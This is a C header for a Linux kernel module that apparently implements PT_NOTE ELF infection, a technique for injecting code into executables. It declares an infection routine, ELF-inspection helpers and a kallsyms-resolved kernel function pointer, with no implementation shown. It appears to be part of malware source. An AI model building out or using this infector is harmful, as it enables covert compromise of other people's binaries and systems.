#ifndef _PT_NOTE_INFECTION_H_
#define _PT_NOTE_INFECTION_H_

#include <linux/fs.h>
#include <linux/elf.h>
#include <linux/types.h>
#include <stddef.h>
#include <uapi/linux/binfmts.h>
#include "resolve_kallsyms.h"

typedef struct elf_phdr *(*load_elf_phdrs_t)(const struct elfhdr *elf_ex, struct file *elf_file);
static load_elf_phdrs_t load_elf_phdrs_ = NULL;

extern int pt_note_infect(struct file *f, void *code, size_t code_size);
extern uintptr_t get_elf_entry(struct file *f);
extern struct file *kernel_open(char *pathname, int flags);
extern int is_elf(struct file *f);
extern int is_elf_exec(struct file *f);

#endif
